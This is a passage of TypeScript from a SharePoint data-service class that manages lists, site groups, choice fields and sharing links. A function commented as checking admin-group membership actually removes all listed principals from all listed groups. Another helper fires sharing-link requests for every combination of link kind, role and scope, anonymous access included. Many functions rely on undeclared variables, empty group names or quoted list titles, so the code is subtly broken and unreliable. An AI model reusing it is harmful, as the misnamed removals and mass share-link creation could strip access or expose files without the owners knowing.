          })
          .catch((error) => {
            console.log(error);
            // this._logError("DataService.tsx", "DataService", "_logError()", error.message);
            console.log(
              "Exception in DataService : \n Component Name-dataService \n Function Name- _logError \n Error-" +
                error.message
            );

            reject(error);
          });
      } catch (error) {
        console.log(
          "Exception in DataService : \n Component Name-dataService \n Function Name- _logError \n Error-" +
            error.message
        );

        reject(error);
      }
    });
  };

  public async _updateDisplayOrdersOfQuestions(
    listName: string,
    itemInfo: any
  ) {
    return new Promise<any>(async (resolve, reject) => {
      try {
        const list = webObj.lists.getById(lid);
        const [batchedSP, execute] = createBatch(list);
        list.using(batchedSP);
        itemInfo.forEach((item: any) => {
          const id = item.questionId;
          list.items
            .getById(id)
            .update({ DisplayOrder: item.displayOrder })
            .then((response) => resolve(response))
            .catch((error) => reject(error));
        });
        await execute().catch((e: any) => {
          reject(e);
        });
      } catch (error) {
        console.log(error);
        this._logError(
          "DataService.tsx",
          "DataService",
          "_updateMultipleListItems()",
          error.message
        );
        console.log(
          "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _updateMultipleListItems \n Error-" +
            error.message
        );
        reject(error);
      }
    });
  }

  //siteGroups calls

  //add user to DTO admin group
  public _addUserInDTOadminGroup(groupID: number, users: any): Promise<any> {
    // list.using(batchedSP);
    return new Promise<any>(async (resolve, reject) => {
      try {
        // const user = await webObj.ensureUser(users.loginName)

        groupIds.map((gid: any) => {
          personGroup.forEach((pg) => {
            webObj.siteGroups
              .getById(gid)
              .users.add(pg)
              .then((val) => {
                resolve(val);
              })
              .catch((error: { message: string }) => {
                console.log(
                  "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroupsUser \n Error-" +
                    error.message
                );
                this._logError(
                  "DataService.tsx",
                  "DataService",
                  "_getDTOAdminGroupsUser()",
                  error.message
                );

                reject(error);
              });
          });
        });
      } catch (error) {
        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroupsUser \n Error-" +
            error.message
        );
        this._logError(
          "DataService.tsx",
          "DataService",
          "_getDTOAdminGroupsUser()",
          error.message
        );

        reject(error);
      }
    });
  }
  //check if user is present in current DTO admin group
  public _ensureUserIsInDTOAdminGroup(): Promise<any> {
    // list.using(batchedSP);
    return new Promise<any>(async (resolve, reject) => {
      try {
        groupIds.map((gid: any) => {
          principleIds.forEach((pg) => {
            webObj.siteGroups
              .getById(gid)
              .users.removeById(pg)
              .then((val) => {
                resolve(val);
              })
              .catch((error: { message: string }) => {
                console.log(
                  "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroupsUser \n Error-" +
                    error.message
                );
                this._logError(
                  "DataService.tsx",
                  "DataService",
                  "_getDTOAdminGroupsUser()",
                  error.message
                );

                reject(error);
              });
          });
        });
      } catch (error) {
        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroupsUser \n Error-" +
            error.message
        );
        this._logError(
          "DataService.tsx",
          "DataService",
          "_getDTOAdminGroupsUser()",
          error.message
        );

        reject(error);
      }
    });
  }

  //to get detail of DTO admin
  public _getDTOAdminGroup(): Promise<any> {
    return new Promise<any>(async (resolve, reject) => {
      try {
        webObj.siteGroups
          .getByName("")()
          .then((val) => {
            resolve(val);
          })
          .catch((error: { message: string }) => {
            console.log(
              "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroup \n Error-" +
                error.message
            );
            this._logError(
              "DataService.tsx",
              "DataService",
              "_getDTOAdminGroup()",
              error.message
            );

            reject(error);
          });
      } catch (error) {
        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroup \n Error-" +
            error.message
        );
        this._logError(
          "DataService.tsx",
          "DataService",
          "_getDTOAdminGroup()",
          error.message
        );

        reject(error);
      }
    });
  }

  //get all users of DTO admin group
  public _getDTOAdminGroupsUser(groupID: any): Promise<any> {
    return new Promise<any>(async (resolve, reject) => {
      try {
        webObj.siteGroups
          .getById(groupID)
          .users()
          .then((val) => {
            resolve(val);
          })
          .catch((error: { message: string }) => {
            console.log(
              "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroupsUser \n Error-" +
                error.message
            );
            this._logError(
              "DataService.tsx",
              "DataService",
              "_getDTOAdminGroupsUser()",
              error.message
            );

            reject(error);
          });
      } catch (error) {
        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroupsUser \n Error-" +
            error.message
        );
        this._logError(
          "DataService.tsx",
          "DataService",
          "_getDTOAdminGroupsUser()",
          error.message
        );

        reject(error);
      }
    });
  }
  //get remove selected user
  public _removeUserFromDTOadminGroup(
    groupID: any,
    userLoginName: any
  ): Promise<any> {
    // list.using(batchedSP);
    return new Promise<any>(async (resolve, reject) => {
      try {
        webObj.siteGroups
          .getById(groupID)
          .users.removeByLoginName(userLoginName)
          .then((val) => {
            resolve(val);
          })
          .catch((error: { message: string }) => {
            console.log(
              "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroupsUser \n Error-" +
                error.message
            );
            this._logError(
              "DataService.tsx",
              "DataService",
              "_getDTOAdminGroupsUser()",
              error.message
            );

            reject(error);
          });
      } catch (error) {
        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDTOAdminGroupsUser \n Error-" +
            error.message
        );
        this._logError(
          "DataService.tsx",
          "DataService",
          "_getDTOAdminGroupsUser()",
          error.message
        );

        reject(error);
      }
    });
  }

  public async _addOptionsToSiteColumn(fieldName: string, newChoices: string) {
    try {
      return new Promise(async (resolve, reject) => {
        // Field object
        let field = await webObj.fields.getByInternalNameOrTitle(fieldName);
        // Getting current choice values
        field
          .select("Choices")()
          .then((fieldData) => {
            // Append only unique choices
            let choices: string[] | any = fieldData.Choices; // For verbose & minimalmetadata
            let newUniqueChoices: any[] = [];
            if (choices.indexOf(newChoices) === -1) {
              newUniqueChoices.push(newChoices);
            }
            // Update choice field with new array of choices
            field
              .update(
                {
                  Choices: choices.concat(newUniqueChoices),
                },
                "SP.FieldMultiChoice"
              )
              .then((results) => {
                resolve(true);
              })
              .catch((error) => {
                reject(error);
              });
          })
          .catch((error) => {
            this._logError(
              "DataService.tsx",
              "DataService",
              "_addOptionsToSiteColumn()",
              error.message
            );
            console.log(
              "Exception in DataService : \n Component Name- DataService \n Function Name-  _addOptionsToSiteColumn \n Error-" +
                error.message
            );

            reject(error);
          });
      });
    } catch (error) {
      console.log(error);
    }
  }

  public async _addAssignedByData(
    listName: string,
    dataToAdd: any[],
    objectiveId: any
  ): Promise<any> {
    try {
      if (dataToAdd !== null && dataToAdd !== undefined) {
        if (dataToAdd.length > 0) {
          return new Promise<any>(async (resolve, reject) => {
            const list = webObj.lists.getById(lid);
            const [batchedSP, execute] = createBatch(list);
            list.using(batchedSP);
            dataToAdd.forEach((item: any) => {
              const addObject = {
                OwnerLoginName: item.OwnerTitle.toString(),
                Assigned_x0020_By: item.AssignedBy,
                ObjectiveIdId: objectiveId,
                IsDeleted: false,
              };
              list.items.add(addObject).catch((error) => reject(error));
            });
            await execute()
              .then((response) => resolve(true))
              .catch((e: any) => {
                this._logError(
                  "DataService.tsx",
                  "DataService",
                  "_addOrUpdateBulkData()",
                  e.message
                );
                console.log(
                  "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _addOrUpdateBulkData \n Error-" +
                    e.message
                );
                reject(e);
              });
          });
        }
      }
    } catch (error) {
      console.log(error);
      this._logError(
        "DataService.tsx",
        "DataService",
        "_addOrUpdateChecklist()",
        error.message
      );
      console.log(
        "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _addOrUpdateChecklist \n Error-" +
          error.message
      );
    }
  }

  //validate JSON string for owner and teammeber
  isJsonString = (jsonString: any) => {
    try {
      if (typeof jsonString !== "string") return false;
      try {
        const result = JSON.parse(jsonString);
        const type = Object.prototype.toString.call(result);
        return type === "[object Object]" || type === "[object Array]";
      } catch (err) {
        return false;
      }
    } catch (e) {
      this._logError(
        "DataService.tsx",
        "DataService",
        "fetchDTOAdminListData()",
        e.message
      );
      console.log(
        "Exception in DataService.tsx : \n Component Name- SynopsysPortfolioManagementIntakeTab \n Function Name-  fetchDTOAdminListData \n Error-" +
          e.message
      );
    }
  };

  //update actuals data to the objective list
  public _updateObjectiveProgress(
    id: number,
    progress: any,
    comments: string,
    updatedBy: any
  ): Promise<any> {
    return new Promise<any>(async (resolve, reject) => {
      try {
        webObj.lists
          .getByTitle(`"${listName}"`)
          .items.getById(id)
          .update({
            Updated_x0020_Progress: progress,
            Comment: comments,
            ProgressUpdatedBy: updatedBy,
            IsProgressManuallyUpdated: true,
          })
          .then((val) => {
            resolve(val);
          })
          .catch((error: { message: string }) => {
            this._logError(
              "DataService.tsx",
              "DataService",
              "_updateObjectiveProgress()",
              error.message
            );

            console.log(
              "Exception in DataService : \n Component Name- DataService \n Function Name-  _updateObjectiveProgress \n Error-" +
                error.message
            );
            reject(error);
          });
      } catch (error) {
        this._logError(
          "DataService.tsx",
          "DataService",
          "_updateObjectiveProgress()",
          error.message
        );

        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _updateObjectiveProgress \n Error-" +
            error.message
        );
        reject(error);
      }
    });
  }

  // Helper functions for optimized sharing operations
  private createShareLinkPayload = (settings: {
    allowAnonymousAccess: boolean;
    linkKind: number;
    role: number;
    scope: number;
    restrictShareMembership?: boolean;
    expiration?: string | null;
    password?: string;
    updatePassword?: boolean;
    peoplePickerInput?: string;
  }) => {
    return {
      request: {
        createLink: true,
        settings: {
          allowAnonymousAccess: settings.allowAnonymousAccess,
          trackLinkUsers: false,
          linkKind: settings.linkKind,
          expiration: settings.expiration || null,
          role: settings.role,
          restrictShareMembership: settings.restrictShareMembership || false,
          updatePassword: settings.updatePassword || false,
          password: settings.password || "",
          scope: settings.scope,
          nav: "",
        },
        ...(settings.peoplePickerInput && {
          peoplePickerInput: settings.peoplePickerInput,
        }),
      },
    };
  };

  private sendShareLinkRequest = async (
    method: string,
    payload: any,
    delayMs: number = 20
  ) => {
    const url = `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/Lists(@a1)/GetItemById(@a2)/ShareLink?@a1=%27${lid}%27&@a2=%27${itemId}%27`;
    await this.sendRequest(method, url, JSON.stringify(payload));
    await this.delay(delayMs);
  };

  private executeShareLinkCombinations = async (config: {
    allowAnonymousAccess: boolean;
    restrictShareMembership?: boolean;
    expiration?: string | null;
    password?: string;
    updatePassword?: boolean;
    peoplePickerInput?: string;
    methods?: string[];
    customScopes?: number[];

    customRoles?: number[];
    customKinds?: number[];
    delayMs?: number;
  }) => {
    const {
      allowAnonymousAccess,
      restrictShareMembership = false,
      expiration = null,
      password = "",
      updatePassword = false,
      peoplePickerInput,
      methods = ["POST"],
      customScopes = scope,
      customRoles = roles2,
      customKinds = kinds,
      delayMs = 20,
    } = config;

    for (const kind of customKinds) {
      for (const role of customRoles) {
        for (const scopeId of customScopes) {
          const payload = this.createShareLinkPayload({
            allowAnonymousAccess,
            linkKind: kind,
            role,
            scope: scopeId,
            restrictShareMembership,
            expiration,
            password,
            updatePassword,
            peoplePickerInput,
          });

          for (const method of methods) {
            await this.sendShareLinkRequest(method, payload, delayMs);
          }
        }
        await this.delay(20);
      }
      await this.delay(30);
    }
  };


  public getPrincipalIds = async (): Promise<number[]> => {
  const principalIds: number[] = [];
  const u: any[] = [];

  // Get all users
  const users: any[] = await webObj.siteUsers();
  users.forEach(u =>!u.IsHiddenInUI ? principalIds.push(u.Id):'');
  users.forEach(uu =>!uu.IsHiddenInUI ? u.push(uu):'');

  // Get all groups
  const groups: any[] = await webObj.siteGroups();
  groups.forEach(g =>g.OwnerTitle!=="System Account"? principalIds.push(g.Id):"");
  groups.forEach(g =>g.OwnerTitle!=="System Account"? u.push(g):"");

  console.log(principalIds);
  console.log(u);
  

  return principalIds;
};

}
